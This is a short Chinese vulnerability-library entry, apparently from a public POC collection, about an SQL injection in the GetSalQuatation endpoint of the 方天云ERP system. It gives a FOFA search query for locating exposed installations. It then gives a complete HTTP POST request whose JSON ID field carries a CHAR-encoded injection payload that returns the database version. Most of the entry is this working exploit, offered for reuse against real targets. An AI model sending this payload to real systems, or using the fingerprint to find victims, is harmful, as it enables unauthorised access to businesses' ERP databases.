---
fofa: "body="
source: "wy876 漏洞文库"
---

# 方天云ERP系统GetSalQuatation存在SQL注入漏洞

# 一、漏洞简介
方天软件以云ERP+MES产品为核心，整合设备层的工业数据，提供软硬件智能+整合方案服务，赋能数字工厂新智造。在模具制造、五金机械、塑胶成型、电子组装等行业成效显著，包括财富500强的企业也正在通过方天软件的综合管理方案而持续获益。方天云ERP系统GetSalQuatation存在SQL注入漏洞

# 二、影响版本
+ 方天云ERP

# 三、资产测绘
+ fofa`body="AjaxMethods.asmx/GetCompanyItem"`
+ 特征


# 四、漏洞复现
```http
POST /AjaxMethods.asmx/GetSalQuatation HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Connection: close
 
{ID:"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgp6fcox304sdet3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
